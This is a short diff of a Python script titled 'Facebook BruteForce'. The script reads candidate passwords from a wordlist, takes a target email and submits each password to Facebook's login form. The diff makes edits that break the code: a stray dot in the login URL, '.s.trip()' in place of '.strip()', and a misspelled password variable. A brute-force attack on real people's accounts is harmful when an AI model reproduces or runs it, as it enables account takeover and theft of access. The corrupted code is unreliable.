@@ -14,7 +14,7 @@ if sys.version_info[0] !=3:
 
 	sys.exit()
 
-post_url='https://www.facebook.com/login.php'
+post_url='https://www.facebook.com/login.php.'
 
 headers = {
 
@@ -44,7 +44,7 @@ print('\n---------- Welcome To Facebook BruteForce ----------\n')
 
 file=open('abedwords.txt','r')
 
-email=str(raw_input('Enter Email/Username : ').strip())
+email=str(raw_input('Enter Email/Username : ').s.trip())
 
 print "\nTarget Email ID : ",email
 
@@ -74,7 +74,7 @@ while file:
 
 			browser.form['email'] = email
 
-			browser.form['pass'] = passw
+			browser.form['pass'] = passwo
 
 			response = browser.submit()
 
